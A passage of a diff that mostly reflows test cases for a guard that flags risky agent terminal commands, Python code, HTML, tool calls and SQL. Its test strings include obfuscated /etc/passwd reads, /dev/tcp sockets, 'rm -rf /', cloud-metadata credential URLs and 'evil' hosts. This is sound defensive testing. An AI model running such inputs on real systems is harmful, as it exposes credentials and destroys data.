@@ -233,7 +233,10 @@ def _clear_pending():
         ("grep -R TOKEN ~/logs", True),  # tilde-home recursive root escapes
         ("cat /etc/pass{w,}d", True),  # brace expansion builds /etc/passwd
         ("cat report{1,2}.txt", False),  # benign brace stays safe
-        ("cat /e{t,}c/pass?d", True),  # brace-expanded candidate then a glob resolves it
+        (
+            "cat /e{t,}c/pass?d",
+            True,
+        ),  # brace-expanded candidate then a glob resolves it
         ("cat /et{c,}/pass?d", True),  # brace + glob in the tail
         ("cat repo/d{1,2}/f?.txt", False),  # benign brace + glob stays safe
         ("cat /etc/pass${x:-wd}", True),  # default param expansion builds path
@@ -269,7 +272,10 @@ def _clear_pending():
         ("g=abc; cat /$g/readme", False),  # benign assigned path stays safe
         ("cat /etc/pass[[:lower:]]d", True),  # POSIX class glob builds /etc/passwd
         ("x=passwd; p=x; cat /etc/${!p}", True),  # indirect expansion builds path
-        ("x=notes; p=x; cat /home/${!p}", False),  # benign indirect expansion stays safe
+        (
+            "x=notes; p=x; cat /home/${!p}",
+            False,
+        ),  # benign indirect expansion stays safe
         ("cat </dev/tcp/example.com/80", True),  # bash /dev/tcp opens a socket
         ("cat < /dev/udp/1.2.3.4/53", True),  # bash /dev/udp opens a socket
         ("cat /dev/null", False),  # ordinary /dev file stays safe
@@ -288,7 +294,10 @@ def _clear_pending():
         ("uniq input.txt output.txt", True),  # second positional is a written OUTPUT
         ("uniq -f 2 in out", True),  # numeric flag value skipped, two file positionals
         ("uniq input.txt", False),  # single positional reads to stdout, stays safe
-        ("uniq 123 out.txt", True),  # digit-named INPUT still leaves out.txt as the 2nd file
+        (
+            "uniq 123 out.txt",
+            True,
+        ),  # digit-named INPUT still leaves out.txt as the 2nd file
         ("uniq 123", False),  # a single digit-named input reads to stdout, stays safe
         ("uniq --skip-fields=2 input.txt", False),  # attached flag value, single file
         ("sort a.txt | uniq -c", False),  # piped uniq with no output file stays safe
@@ -304,7 +313,10 @@ def _clear_pending():
         ("date +%Y-%m-%d", False),  # a +FORMAT display token stays read-only
         ("date -u +%s", False),  # -u display flag with a +FORMAT stays safe
         ("date -d tomorrow", False),  # -d STRING only displays the given date
-        ("date -d yesterday +%Y", False),  # -d value skipped, +FORMAT display stays safe
+        (
+            "date -d yesterday +%Y",
+            False,
+        ),  # -d value skipped, +FORMAT display stays safe
         ("date -r file.txt", False),  # -r FILE displays a file's mtime, read-only
         ("file -C -m mymagic", True),  # file -C compiles a magic database (writes .mgc)
         ("file --compile -m mymagic", True),  # long form of the compile flag
@@ -346,9 +358,15 @@ def test_terminal_classifier(command, unsafe):
         ("import tempfile\ntempfile.mkstemp()", True),  # tempfile side effects
         ("getattr(os, 'remove')('x')", True),  # dynamic call target
         ("import os as o\no.open('out.txt', o.O_CREAT)", True),  # os.open via alias
-        ("from os import open as o, O_CREAT\no('out', O_CREAT)", True),  # os.open bare name
+        (
+            "from os import open as o, O_CREAT\no('out', O_CREAT)",
+            True,
+        ),  # os.open bare name
         ("from pathlib import Path\nPath('l').symlink_to('t')", True),  # pathlib link
-        ("import importlib\nimportlib.import_module('subprocess')", True),  # dynamic import
+        (
+            "import importlib\nimportlib.import_module('subprocess')",
+            True,
+        ),  # dynamic import
         ("import os\nos.mkfifo('p')", True),  # node creation
         ("import os\nos.utime('x', None)", True),  # metadata mutation
         ("f = open\nf('x', 'w')", True),  # builtin open aliased to a name
@@ -364,13 +382,28 @@ def test_terminal_classifier(command, unsafe):
         ("import builtins\nbuiltins.exec('x=1')", True),  # attribute exec
         ("import builtins as b\nb.eval('1')", True),
         ("import re\nre.compile('x')", False),  # re.compile is not eval/exec
-        ("import os\nopen(os.path.join('/etc', 'passwd')).read()", True),  # composed path
+        (
+            "import os\nopen(os.path.join('/etc', 'passwd')).read()",
+            True,
+        ),  # composed path
         ("open('/etc' + '/passwd').read()", True),  # concatenated path
-        ("import zipfile\nzipfile.ZipFile('o.zip', 'w').writestr('x', 'y')", True),  # zip write
+        (
+            "import zipfile\nzipfile.ZipFile('o.zip', 'w').writestr('x', 'y')",
+            True,
+        ),  # zip write
         ("import zipfile\nzipfile.ZipFile('o.zip', mode='a')", True),
-        ("import zipfile\nzipfile.ZipFile('a.zip').read('n')", False),  # zip read stays safe
-        ("import os\nopen(f'/proc/{os.getppid()}/environ').read()", True),  # f-string procfs
-        ("import os\nos.chdir('/')\nprint(open('etc/passwd').read())", True),  # chdir escape
+        (
+            "import zipfile\nzipfile.ZipFile('a.zip').read('n')",
+            False,
+        ),  # zip read stays safe
+        (
+            "import os\nopen(f'/proc/{os.getppid()}/environ').read()",
+            True,
+        ),  # f-string procfs
+        (
+            "import os\nos.chdir('/')\nprint(open('etc/passwd').read())",
+            True,
+        ),  # chdir escape
         (
             "from pathlib import Path\nprint((Path('/etc') / 'passwd').read_text())",
             True,
@@ -400,30 +433,54 @@ def test_terminal_classifier(command, unsafe):
             "box.f = open\nbox.f('out.txt', 'w').write('x')",
             True,
         ),  # open bound onto an attribute then called
-        ("box.f = len\nbox.f([])", False),  # a benign attribute-bound callable stays safe
+        (
+            "box.f = len\nbox.f([])",
+            False,
+        ),  # a benign attribute-bound callable stays safe
         (
             "open.__call__('out.txt', 'w').write('x')",
             True,
         ),  # open invoked via .__call__ still writes
         ("print.__call__('x')", False),  # a benign .__call__ stays safe
-        ("import builtins\nf = builtins.open\nf('out', 'w')", True),  # attribute alias write
+        (
+            "import builtins\nf = builtins.open\nf('out', 'w')",
+            True,
+        ),  # attribute alias write
         ("open('out', **{'mode': 'w'}).write('x')", True),  # kwargs splat mode
         ("name = 'passwd'\nopen(f'/etc/{name}').read()", True),  # dynamic /etc segment
-        ("import os\nopen(os.path.join('/etc', name)).read()", True),  # composed dynamic seg
+        (
+            "import os\nopen(os.path.join('/etc', name)).read()",
+            True,
+        ),  # composed dynamic seg
         ("open(f'/tmp/{name}.txt').read()", False),  # dynamic seg under /tmp stays safe
-        ("import pathlib\n(pathlib.Path('/etc') / name).read_text()", True),  # qualified pathlib
-        ("import pathlib\n(pathlib.Path('data') / name).read_text()", False),  # relative stays safe
+        (
+            "import pathlib\n(pathlib.Path('/etc') / name).read_text()",
+            True,
+        ),  # qualified pathlib
+        (
+            "import pathlib\n(pathlib.Path('data') / name).read_text()",
+            False,
+        ),  # relative stays safe
         ("f: object = open\nf('out', 'w').write('x')", True),  # annotated open alias
-        ("import urllib3\nurllib3.PoolManager().request('GET', 'http://x')", True),  # network
+        (
+            "import urllib3\nurllib3.PoolManager().request('GET', 'http://x')",
+            True,
+        ),  # network
         ("import dbm\ndbm.open('cache', 'c')", True),  # dbm create flag writes
         ("import dbm\ndbm.open('cache')", True),  # dbm import itself signals writes
         (
             "import sqlite3\nsqlite3.connect('results.db').execute('create table t(x)')",
             True,
         ),  # sqlite3 db write
-        ("import sqlite3\nsqlite3.connect('data.db')", True),  # sqlite3 connect creates the file
+        (
+            "import sqlite3\nsqlite3.connect('data.db')",
+            True,
+        ),  # sqlite3 connect creates the file
         ("import posix as p\np.open('out', 64)", True),  # posix.open via module alias
-        ("import os as o\nprint(o.getcwd())", False),  # read-only os-alias use stays safe
+        (
+            "import os as o\nprint(o.getcwd())",
+            False,
+        ),  # read-only os-alias use stays safe
         ("model.save_pretrained('out')", True),  # transformers/peft persistence helper
         (
             "from safetensors.torch import save_file\nsave_file(sd, 'o.safetensors')",
@@ -460,12 +517,18 @@ def test_terminal_classifier(command, unsafe):
             "from pathlib import Path\nlist(Path('/etc').rglob('*'))",
             True,
         ),  # recursive glob over a system dir
-        ("import glob\nglob.glob('/home/*')", True),  # glob.glob pattern rooted absolute
+        (
+            "import glob\nglob.glob('/home/*')",
+            True,
+        ),  # glob.glob pattern rooted absolute
         (
             "from pathlib import Path\nlist(Path('~').expanduser().glob('*'))",
             True,
         ),  # glob over the home directory
-        ("import glob\nglob.glob('src/*.py')", False),  # relative glob pattern stays safe
+        (
+            "import glob\nglob.glob('src/*.py')",
+            False,
+        ),  # relative glob pattern stays safe
         (
             "import os\nbase = os.path.abspath('/etc')\nopen(base + '/passwd').read()",
             True,
@@ -481,7 +544,10 @@ def test_terminal_classifier(command, unsafe):
         ("import torch\ntorch.load('model.pt')", True),  # pickle-backed loader
         ("import joblib\njoblib.load('x.pkl')", True),  # joblib loader
         ("import pandas as pd\npd.read_pickle('x.pkl')", True),  # pandas pickle reader
-        ("import json\nprint(json.load(open('x.json')))", False),  # json.load stays safe
+        (
+            "import json\nprint(json.load(open('x.json')))",
+            False,
+        ),  # json.load stays safe
         (
             "import types\nc = compile('x=1', '', 'exec')\nf = types.FunctionType(c, globals())\nf()",
             True,
@@ -502,7 +568,10 @@ def test_terminal_classifier(command, unsafe):
         ("print(''.join(['a', 'b']))", False),  # benign join stays safe
         ("from builtins import eval as e\ne('1')", True),  # aliased builtin eval
         ("import builtins\nx = builtins.exec\nx('a=1')", True),  # attr-aliased exec
-        ("from builtins import __import__ as imp\nimp('os')", True),  # aliased __import__
+        (
+            "from builtins import __import__ as imp\nimp('os')",
+            True,
+        ),  # aliased __import__
         ("from mymod import evaluate as e\ne(1)", False),  # unrelated alias stays safe
         ("base = '/etc'\nopen(base + '/passwd').read()", True),  # literal-var path
         ("d = '/etc'\nopen(f'{d}/passwd').read()", True),  # literal var in f-string
@@ -520,36 +589,99 @@ def test_terminal_classifier(command, unsafe):
         ("open('%s/%s' % ('/etc', 'passwd')).read()", True),  # percent-format path
         ("open('/etc/%s' % name).read()", True),  # percent-format dynamic segment
         ("open('%s/%s' % ('data', 'x.txt')).read()", False),  # benign percent-format
-        ("open('/etc/%(f)s' % {'f': 'passwd'}).read()", True),  # mapping-style percent path
-        ("open('/etc/%(f)s' % {'f': name}).read()", True),  # mapping-style dynamic segment
-        ("open('/etc/%(f)s' % mapping).read()", True),  # non-literal mapping fails closed
-        ("open('data/%(f)s' % {'f': 'x.txt'}).read()", False),  # benign mapping-style stays safe
-        ("import logging\nlogging.FileHandler('out.log', mode='w')", True),  # log file writer
-        ("import logging\nlogging.FileHandler('out.log')", True),  # default append still writes
-        ("from logging import FileHandler\nFileHandler('x.log')", True),  # bare-name file handler
+        (
+            "open('/etc/%(f)s' % {'f': 'passwd'}).read()",
+            True,
+        ),  # mapping-style percent path
+        (
+            "open('/etc/%(f)s' % {'f': name}).read()",
+            True,
+        ),  # mapping-style dynamic segment
+        (
+            "open('/etc/%(f)s' % mapping).read()",
+            True,
+        ),  # non-literal mapping fails closed
+        (
+            "open('data/%(f)s' % {'f': 'x.txt'}).read()",
+            False,
+        ),  # benign mapping-style stays safe
+        (
+            "import logging\nlogging.FileHandler('out.log', mode='w')",
+            True,
+        ),  # log file writer
+        (
+            "import logging\nlogging.FileHandler('out.log')",
+            True,
+        ),  # default append still writes
+        (
+            "from logging import FileHandler\nFileHandler('x.log')",
+            True,
+        ),  # bare-name file handler
         (
             "import logging.handlers\nlogging.handlers.RotatingFileHandler('x.log')",
             True,
         ),  # rotating log file writer
-        ("import logging\nlogging.getLogger('x').info('hi')", False),  # logging read stays safe
-        ("from numpy import save\ns = save\ns('out.npy', arr)", True),  # writer aliased to a name
-        ("from zipfile import ZipFile\nz = ZipFile\nz('a.zip', 'w')", True),  # archive ctor aliased
-        ("from numpy import save\ns, _ = (save, 1)\ns('o.npy', a)", True),  # writer destructured
+        (
+            "import logging\nlogging.getLogger('x').info('hi')",
+            False,
+        ),  # logging read stays safe
+        (
+            "from numpy import save\ns = save\ns('out.npy', arr)",
+            True,
+        ),  # writer aliased to a name
+        (
+            "from zipfile import ZipFile\nz = ZipFile\nz('a.zip', 'w')",
+            True,
+        ),  # archive ctor aliased
+        (
+            "from numpy import save\ns, _ = (save, 1)\ns('o.npy', a)",
+            True,
+        ),  # writer destructured
         ("x = len\nx('hi')", False),  # a benign builtin alias stays safe
-        ("import asyncio\nasyncio.create_subprocess_shell('rm -rf /')", True),  # asyncio spawn
-        ("import asyncio\nasyncio.create_subprocess_exec('rm', '-rf', '/')", True),  # asyncio spawn
+        (
+            "import asyncio\nasyncio.create_subprocess_shell('rm -rf /')",
+            True,
+        ),  # asyncio spawn
+        (
+            "import asyncio\nasyncio.create_subprocess_exec('rm', '-rf', '/')",
+            True,
+        ),  # asyncio spawn
         ("import asyncio\nasyncio.sleep(1)", False),  # benign asyncio helper stays safe
-        ("import imaplib\nimaplib.IMAP4('host')", True),  # stdlib mail client opens a connection
+        (
+            "import imaplib\nimaplib.IMAP4('host')",
+            True,
+        ),  # stdlib mail client opens a connection
         ("import poplib\npoplib.POP3('host')", True),  # stdlib mail client
-        ("import xmlrpc.client\nxmlrpc.client.ServerProxy('http://x')", True),  # rpc client
+        (
+            "import xmlrpc.client\nxmlrpc.client.ServerProxy('http://x')",
+            True,
+        ),  # rpc client
         ("import math\nmath.sqrt(2)", False),  # benign stdlib import stays safe
-        ("def f(o=open):\n    o('out', 'w').write('x')\nf()", True),  # open captured in a default
-        ("g = lambda o=open: o('out', 'w')\ng()", True),  # open captured in a lambda default
+        (
+            "def f(o=open):\n    o('out', 'w').write('x')\nf()",
+            True,
+        ),  # open captured in a default
+        (
+            "g = lambda o=open: o('out', 'w')\ng()",
+            True,
+        ),  # open captured in a lambda default
         ("def f(o=len):\n    return o('x')\nf()", False),  # a benign default stays safe
-        ("import numpy as np\ns = np.save\ns('out.npy', arr)", True),  # attribute writer aliased
-        ("from pathlib import Path\np = Path('out').open\np('w')", True),  # bound .open aliased
-        ("import zipfile\nz = zipfile.ZipFile\nz('a.zip', 'w')", True),  # attribute archive ctor
-        ("import numpy as np\nx = np.mean\nx(a)", False),  # a benign attribute alias stays safe
+        (
+            "import numpy as np\ns = np.save\ns('out.npy', arr)",
+            True,
+        ),  # attribute writer aliased
+        (
+            "from pathlib import Path\np = Path('out').open\np('w')",
+            True,
+        ),  # bound .open aliased
+        (
+            "import zipfile\nz = zipfile.ZipFile\nz('a.zip', 'w')",
+            True,
+        ),  # attribute archive ctor
+        (
+            "import numpy as np\nx = np.mean\nx(a)",
+            False,
+        ),  # a benign attribute alias stays safe
         (
             "import numpy as np\nnp.memmap('o', dtype='u1', mode='w+', shape=(1,))",
             True,
@@ -558,8 +690,14 @@ def test_terminal_classifier(command, unsafe):
             "import pandas as pd\npd.ExcelWriter('o.xlsx')",
             True,
         ),  # pandas ExcelWriter creates a file
-        ("import pandas as pd\npd.HDFStore('o.h5')", True),  # pandas HDFStore creates a file
-        ("import asyncio\nasyncio.open_connection('h', 80)", True),  # asyncio outbound connection
+        (
+            "import pandas as pd\npd.HDFStore('o.h5')",
+            True,
+        ),  # pandas HDFStore creates a file
+        (
+            "import asyncio\nasyncio.open_connection('h', 80)",
+            True,
+        ),  # asyncio outbound connection
         (
             "import asyncio\nl = asyncio.get_event_loop()\nl.create_server(P, 'h', 80)",
             True,
@@ -603,7 +741,10 @@ def test_terminal_classifier(command, unsafe):
             "import asyncio\nasyncio.start_unix_server(cb, '/tmp/sock')",
             True,
         ),  # asyncio unix listener
-        ("import os\nos.startfile('calc.exe')", True),  # Windows startfile launches a program
+        (
+            "import os\nos.startfile('calc.exe')",
+            True,
+        ),  # Windows startfile launches a program
         (
             "import socketserver\nsocketserver.TCPServer(('0.0.0.0', 80), H)",
             True,
@@ -759,7 +900,10 @@ def test_terminal_classifier(command, unsafe):
             "open('/home/alice/.cache/huggingface/hub/models--x/config.json').read()",
             False,
         ),  # HF model cache is not a credential
-        ("import numpy as np\nnp.mean([1, 2])", False),  # a benign numpy read stays safe
+        (
+            "import numpy as np\nnp.mean([1, 2])",
+            False,
+        ),  # a benign numpy read stays safe
         (
             "from pathlib import Path\nP = Path\n(P('/etc') / 'passwd').read_text()",
             True,
@@ -816,15 +960,30 @@ def test_terminal_classifier(command, unsafe):
             "from pathlib import Path\n(Path('data') / 'notes').read_text()",
             False,
         ),  # in-sandbox pathlib read stays safe
-        ("import glob\nopen(glob.glob('/e??/passwd')[0]).read()", True),  # python glob to secret
-        ("import glob\nfor f in glob.glob('*.py'):\n    print(f)", False),  # benign glob stays safe
+        (
+            "import glob\nopen(glob.glob('/e??/passwd')[0]).read()",
+            True,
+        ),  # python glob to secret
+        (
+            "import glob\nfor f in glob.glob('*.py'):\n    print(f)",
+            False,
+        ),  # benign glob stays safe
         (
             "import glob\nbase = '/e??'\nopen(glob.glob(base + '/passwd')[0]).read()",
             True,
         ),  # glob pattern folded from a literal variable
-        ("from os.path import join\nopen(join('/etc', 'passwd')).read()", True),  # bare join alias
-        ("from os.path import join\nopen(join('data', 'x.txt')).read()", False),  # benign bare join
-        ("from numpy import save\nsave('out.npy', arr)", True),  # writer imported as a bare name
+        (
+            "from os.path import join\nopen(join('/etc', 'passwd')).read()",
+            True,
+        ),  # bare join alias
+        (
+            "from os.path import join\nopen(join('data', 'x.txt')).read()",
+            False,
+        ),  # benign bare join
+        (
+            "from numpy import save\nsave('out.npy', arr)",
+            True,
+        ),  # writer imported as a bare name
         ("from numpy import mean\nmean(arr)", False),  # benign bare import stays safe
         (
             "from pathlib import Path as P\n(P('/etc') / 'passwd').read_text()",
@@ -926,7 +1085,10 @@ def test_terminal_classifier(command, unsafe):
             "from huggingface_hub import snapshot_download\nsnapshot_download('r')",
             True,
         ),  # bare-imported repo snapshot download
-        ("import statistics\nstatistics.mean([1, 2])", False),  # benign stdlib import stays safe
+        (
+            "import statistics\nstatistics.mean([1, 2])",
+            False,
+        ),  # benign stdlib import stays safe
         # A concrete write callable handed to a user-defined helper that can
         # invoke it bypasses the direct open()/writer site, so it asks.
         (
@@ -941,7 +1103,10 @@ def test_terminal_classifier(command, unsafe):
             "import numpy as np\ndef run(fn): fn('o.npy', a)\nrun(np.save)",
             True,
         ),  # attribute writer passed into a helper
-        ("def run(fn): return fn('x')\nrun(len)", False),  # benign callable arg stays safe
+        (
+            "def run(fn): return fn('x')\nrun(len)",
+            False,
+        ),  # benign callable arg stays safe
     ],
 )
 def test_python_classifier(code, unsafe):
@@ -961,7 +1126,10 @@ def test_render_html_gated_only_when_networked():
 
     assert rh("<h1>Report</h1><p>Summary</p>") is False
     assert (
-        rh("<div id=c></div><script>document.getElementById('c').textContent='x'</script>") is False
+        rh(
+            "<div id=c></div><script>document.getElementById('c').textContent='x'</script>"
+        )
+        is False
     )
     assert rh("<svg xmlns='http://www.w3.org/2000/svg'><circle r=4/></svg>") is False
     assert rh("<img src='./local.png'>") is False
@@ -974,10 +1142,16 @@ def test_render_html_gated_only_when_networked():
     # see (a module worker from a CORS CDN, or a blob/same-origin worker that
     # fetches/importScripts) under worker-src http: https: blob:, so they ask.
     assert rh("<script>new Worker('https://evil/w.js')</script>") is True
-    assert rh("<script>new Worker('https://cdn/x.mjs', {type: 'module'})</script>") is True
+    assert (
+        rh("<script>new Worker('https://cdn/x.mjs', {type: 'module'})</script>") is True
+    )
     assert rh("<script>new SharedWorker('https://evil/w.js')</script>") is True
-    assert rh("<script>var myWorker = 1; console.log(myWorker)</script>") is False  # not a ctor
-    assert rh("<script>new WorkerPool(4)</script>") is False  # unrelated class, not a real Worker
+    assert (
+        rh("<script>var myWorker = 1; console.log(myWorker)</script>") is False
+    )  # not a ctor
+    assert (
+        rh("<script>new WorkerPool(4)</script>") is False
+    )  # unrelated class, not a real Worker
     # Resource-loading forms beyond a direct fetch also reach the network.
     assert rh("<style>body{background:url(https://evil/x.png)}</style>") is True
     assert rh("<style>@import 'https://evil/x.css'</style>") is True
@@ -1004,7 +1178,9 @@ def test_render_html_gated_only_when_networked():
     # A meta-refresh with a url navigates the frame to an external origin.
     assert rh('<meta http-equiv="refresh" content="0;url=https://example.com">') is True
     assert rh("<meta http-equiv='refresh' content='0; url=https://x'>") is True
-    assert rh('<meta http-equiv="refresh" content="30">') is False  # self-reload, no url
+    assert (
+        rh('<meta http-equiv="refresh" content="30">') is False
+    )  # self-reload, no url
     assert rh('<meta charset="utf-8"><h1>Hi</h1>') is False  # ordinary meta stays safe
 
 
@@ -1066,7 +1242,10 @@ def test_is_always_safe_tool():
         ("get_primary_key", False),  # a schema key is not a credential
         ("search_keyboard_shortcuts", False),  # 'key' inside another word stays safe
         ("list_bookmarks", False),  # 'mark' substring in a token stays safe
-        ("list_notifications", False),  # 'notify' is a different token than 'notifications'
+        (
+            "list_notifications",
+            False,
+        ),  # 'notify' is a different token than 'notifications'
     ],
 )
 def test_mcp_classifier(tool, unsafe):
@@ -1084,7 +1263,9 @@ def test_mcp_classifier(tool, unsafe):
         ({"name": "AWS_SECRET_ACCESS_KEY"}, True),
         ({"key": "DATABASE_PASSWORD"}, True),
         (
-            {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
+            {
+                "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+            },
             True,
         ),  # AWS instance-metadata host
         (
@@ -1112,74 +1293,161 @@ def test_mcp_sensitive_arguments(args, unsafe):
         ({"query": "UPDATE t SET x=1"}, True),
         ({"query": "INSERT INTO t VALUES (1)"}, True),
         ({"query": "SELECT * FROM runs"}, False),  # read query stays safe
-        ({"query": "how to delete old files"}, False),  # NL text with 'delete' stays safe
-        ({"query": "find the created_at column"}, False),  # 'created' substring stays safe
+        (
+            {"query": "how to delete old files"},
+            False,
+        ),  # NL text with 'delete' stays safe
+        (
+            {"query": "find the created_at column"},
+            False,
+        ),  # 'created' substring stays safe
         ({"query": "DELETE/**/FROM runs"}, True),  # inline SQL comment as whitespace
         ({"query": "UPDATE/**/t SET x=1"}, True),
         ({"query": "DROP/**/TABLE users"}, True),
-        ({"query": "SELECT * FROM runs -- delete later"}, False),  # trailing comment stays safe
+        (
+            {"query": "SELECT * FROM runs -- delete later"},
+            False,
+        ),  # trailing comment stays safe
         ({"query": "COPY users FROM '/tmp/u.csv'"}, True),  # bulk load writes the table
         ({"query": "COPY users (id, name)\nFROM STDIN"}, True),  # multiline COPY FROM
-        ({"query": "COPY (SELECT 1) TO '/tmp/o.csv'"}, True),  # COPY TO writes a server file
-        ({"query": "SELECT copy_count FROM t"}, False),  # 'copy' substring column stays safe
+        (
+            {"query": "COPY (SELECT 1) TO '/tmp/o.csv'"},
+            True,
+        ),  # COPY TO writes a server file
+        (
+            {"query": "SELECT copy_count FROM t"},
+            False,
+        ),  # 'copy' substring column stays safe
         ({"query": "mutation { deleteIssue(id: 1) }"}, True),  # GraphQL mutation
-        ({"query": "mutation DelIssue { deleteIssue(id: 1) }"}, True),  # named GraphQL mutation
-        ({"query": "mutation # note\n { deleteIssue(id: 1) }"}, True),  # comment before body
-        ({"query": "mutation # c\n Del { deleteIssue(id: 1) }"}, True),  # comment before name
-        ({"query": "query { issue(id: 1) { title } }"}, False),  # GraphQL read query stays safe
-        ({"query": "{ issue(id: 1) { title } }"}, False),  # shorthand GraphQL query stays safe
-        ({"query": "query # note\n { issue(id: 1) }"}, False),  # commented read query stays safe
-        ({"query": "CREATE OR REPLACE VIEW v AS SELECT 1"}, True),  # DDL with a modifier
+        (
+            {"query": "mutation DelIssue { deleteIssue(id: 1) }"},
+            True,
+        ),  # named GraphQL mutation
+        (
+            {"query": "mutation # note\n { deleteIssue(id: 1) }"},
+            True,
+        ),  # comment before body
+        (
+            {"query": "mutation # c\n Del { deleteIssue(id: 1) }"},
+            True,
+        ),  # comment before name
+        (
+            {"query": "query { issue(id: 1) { title } }"},
+            False,
+        ),  # GraphQL read query stays safe
+        (
+            {"query": "{ issue(id: 1) { title } }"},
+            False,
+        ),  # shorthand GraphQL query stays safe
+        (
+            {"query": "query # note\n { issue(id: 1) }"},
+            False,
+        ),  # commented read query stays safe
+        (
+            {"query": "CREATE OR REPLACE VIEW v AS SELECT 1"},
+            True,
+        ),  # DDL with a modifier
         ({"query": "CREATE UNIQUE INDEX idx ON t(x)"}, True),  # DDL with UNIQUE
         ({"query": "CREATE TEMP TABLE t (id int)"}, True),  # DDL with TEMP
-        ({"query": "CREATE MATERIALIZED VIEW mv AS SELECT 1"}, True),  # materialized view DDL
+        (
+            {"query": "CREATE MATERIALIZED VIEW mv AS SELECT 1"},
+            True,
+        ),  # materialized view DDL
         ({"query": "CREATE FUNCTION f() RETURNS int AS $$ $$"}, True),  # function DDL
-        ({"query": "ALTER SYSTEM SET work_mem = '1GB'"}, True),  # persists server config
+        (
+            {"query": "ALTER SYSTEM SET work_mem = '1GB'"},
+            True,
+        ),  # persists server config
         ({"query": "alter system reset all"}, True),  # ALTER SYSTEM RESET
-        ({"query": "SELECT * FROM system_logs"}, False),  # 'system' as a table name stays safe
-        ({"query": "SELECT * FROM created_view"}, False),  # 'create' substring stays safe
+        (
+            {"query": "SELECT * FROM system_logs"},
+            False,
+        ),  # 'system' as a table name stays safe
+        (
+            {"query": "SELECT * FROM created_view"},
+            False,
+        ),  # 'create' substring stays safe
         ({"query": "CALL delete_all_users()"}, True),  # stored procedure invocation
         ({"query": "EXEC purge_queue"}, True),  # EXEC procedure
         ({"query": "EXECUTE sp_drop"}, True),  # EXECUTE procedure
         ({"query": "VACUUM INTO 'backup.db'"}, True),  # VACUUM rewrites the database
         ({"query": "please call me back later"}, False),  # NL 'call' stays safe
-        ({"query": "ATTACH DATABASE '/tmp/x.db' AS x"}, True),  # attaches a database file
+        (
+            {"query": "ATTACH DATABASE '/tmp/x.db' AS x"},
+            True,
+        ),  # attaches a database file
         ({"query": "DETACH DATABASE x"}, True),  # detaches a database
         ({"query": "PRAGMA user_version = 42"}, True),  # write-form PRAGMA
         ({"query": "PRAGMA journal_mode=WAL"}, True),  # write-form PRAGMA (no spaces)
         ({"query": "PRAGMA foreign_keys(0)"}, True),  # call-form PRAGMA write
         ({"query": "SELECT load_extension('/tmp/evil.so')"}, True),  # loads native code
         ({"query": "PRAGMA journal_mode"}, False),  # read-form PRAGMA stays safe
-        ({"query": "can you attach the report to the email"}, False),  # NL 'attach' stays safe
+        (
+            {"query": "can you attach the report to the email"},
+            False,
+        ),  # NL 'attach' stays safe
         ({"query": "ATTACH '/tmp/x.db' AS x"}, True),  # ATTACH without DATABASE keyword
-        ({"query": "PRAGMA main.user_version = 1"}, True),  # schema-qualified write PRAGMA
+        (
+            {"query": "PRAGMA main.user_version = 1"},
+            True,
+        ),  # schema-qualified write PRAGMA
         ({"query": "attach it as draft"}, False),  # NL 'attach ... as' stays safe
         ({"query": "DROP FUNCTION f()"}, True),  # DROP of a non-table object
-        ({"query": "ALTER INDEX idx RENAME TO idx2"}, True),  # ALTER of a non-table object
+        (
+            {"query": "ALTER INDEX idx RENAME TO idx2"},
+            True,
+        ),  # ALTER of a non-table object
         ({"query": "DROP MATERIALIZED VIEW mv"}, True),  # DROP with a modifier
         ({"query": "ALTER USER bob WITH PASSWORD 'x'"}, True),  # ALTER USER mutates
-        ({"query": "SELECT dropped_at FROM t"}, False),  # 'drop' substring column stays safe
-        ({"query": "mutation M @audit { deleteIssue(id: 1) }"}, True),  # directive GraphQL mutation
+        (
+            {"query": "SELECT dropped_at FROM t"},
+            False,
+        ),  # 'drop' substring column stays safe
+        (
+            {"query": "mutation M @audit { deleteIssue(id: 1) }"},
+            True,
+        ),  # directive GraphQL mutation
         (
             {"query": "query Q @cached { issue(id: 1) { title } }"},
             False,
         ),  # directive GraphQL read stays safe
         ({"query": 'UPDATE "users" SET admin=1'}, True),  # double-quoted UPDATE target
         ({"query": "UPDATE public.users SET admin=1"}, True),  # schema-qualified UPDATE
-        ({"query": "UPDATE ONLY public.users SET admin=1"}, True),  # ONLY-qualified UPDATE
+        (
+            {"query": "UPDATE ONLY public.users SET admin=1"},
+            True,
+        ),  # ONLY-qualified UPDATE
         ({"query": "UPDATE `users` SET admin=1"}, True),  # backtick-quoted UPDATE
         ({"query": "UPDATE [users] SET admin=1"}, True),  # bracket-quoted UPDATE
-        ({"query": "please update the documentation set"}, False),  # NL 'update ... set' stays safe
-        ({"query": "SELECT pg_terminate_backend(123)"}, True),  # state-changing SQL function
+        (
+            {"query": "please update the documentation set"},
+            False,
+        ),  # NL 'update ... set' stays safe
+        (
+            {"query": "SELECT pg_terminate_backend(123)"},
+            True,
+        ),  # state-changing SQL function
         ({"query": "SELECT setval('s', 1)"}, True),  # sequence mutation function
-        ({"query": "SELECT pg_write_file('/tmp/p', 'x')"}, True),  # server-side file write
-        ({"query": "SELECT lo_export(123, '/tmp/p')"}, True),  # large-object export to a file
-        ({"query": "SELECT setval_col FROM t"}, False),  # 'setval' column prefix stays safe
+        (
+            {"query": "SELECT pg_write_file('/tmp/p', 'x')"},
+            True,
+        ),  # server-side file write
+        (
+            {"query": "SELECT lo_export(123, '/tmp/p')"},
+            True,
+        ),  # large-object export to a file
+        (
+            {"query": "SELECT setval_col FROM t"},
+            False,
+        ),  # 'setval' column prefix stays safe
         (
             {"query": "SELECT secret INTO OUTFILE '/tmp/leak' FROM users"},
             True,
         ),  # INTO OUTFILE write
-        ({"query": "SELECT x INTO DUMPFILE '/tmp/d' FROM t"}, True),  # INTO DUMPFILE write
+        (
+            {"query": "SELECT x INTO DUMPFILE '/tmp/d' FROM t"},
+            True,
+        ),  # INTO DUMPFILE write
         (
             {"query": "SELECT count(*) INTO cnt FROM t"},
             False,
@@ -1187,29 +1455,62 @@ def test_mcp_sensitive_arguments(args, unsafe):
         ({"query": "REFRESH MATERIALIZED VIEW mv"}, True),  # materialized view rewrite
         ({"query": "REINDEX INDEX idx"}, True),  # index rebuild
         ({"query": "REINDEX TABLE t"}, True),  # table reindex
-        ({"query": "SELECT refresh_count FROM t"}, False),  # 'refresh' column stays safe
+        (
+            {"query": "SELECT refresh_count FROM t"},
+            False,
+        ),  # 'refresh' column stays safe
         ({"query": "please refresh the page"}, False),  # NL 'refresh' stays safe
-        ({"query": "COMMENT ON TABLE users IS 'owned'"}, True),  # catalog metadata write
+        (
+            {"query": "COMMENT ON TABLE users IS 'owned'"},
+            True,
